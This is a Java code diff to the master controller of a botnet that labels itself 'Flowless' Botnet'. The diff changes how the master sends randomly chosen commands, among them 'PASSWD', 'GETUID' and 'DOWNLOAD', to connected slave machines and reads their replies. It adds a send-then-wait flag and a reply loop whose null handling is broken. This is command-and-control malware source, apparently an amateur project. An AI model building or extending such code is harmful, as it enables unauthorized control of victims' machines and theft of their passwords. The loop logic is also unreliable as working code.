@@ -22,6 +22,8 @@ public class Controller {
 
   ServerSocket servSock;
 
+  static boolean go = true;
+
   public static void main(String[] args) throws IOException, InterruptedException {
     System.out.println("-------------------------------");
     System.out.println("| Flowless' Botnet --- Master |");
@@ -40,13 +42,14 @@ public class Controller {
       if (sockets.size() > 0) {
         // Get the first client in sockets, to know which client to send the message to
         Socket sock = sockets.get(0);
-        sendCommand(sock);
+        if (go) {
+          sendCommand(sock);
+        }
         receiveReply(sock);
         // Sleep to avoid spam
         int sleepTime = 1000; //milliseconds
         Thread.sleep(sleepTime);
       }
-
     }
   }
 
@@ -54,7 +57,6 @@ public class Controller {
     //Randomize a integer which will choose [i] of command array
     Random rand = new Random();
     int choice = rand.nextInt(4);
-    //System.out.println(choice);
     //The chosen command will be sent to away
     String[] commands = {"VERSION", "PASSWD", "GETUID", "DOWNLOAD"};
     // Determine command to be sent
@@ -64,6 +66,7 @@ public class Controller {
     // Sent and flush toilet
     out.println(commands[choice]);
     out.flush();
+    go = false;
   }
 
   static void receiveReply(Socket sock) throws IOException {  //Read what is received and print out to console
@@ -74,11 +77,17 @@ public class Controller {
     if (!in.ready()) {
       return;
     }
-    // Reads commands from Controller
-    String command = in.readLine();
-    if (command.length() >= 1) { // If reply, print it out
-      System.out.println("Reply: "+ command);
-    }
+    // Reads reply from Slave
+    String reply = null;
+    do {
+      reply = in.readLine();
+      if (reply.length() >= 1) { // If reply, print it out
+        System.out.println("Reply: "+ reply);
+      }
+    } while (reply == null);
+
+    go = true;
+
   }
 
   void Open() throws IOException {
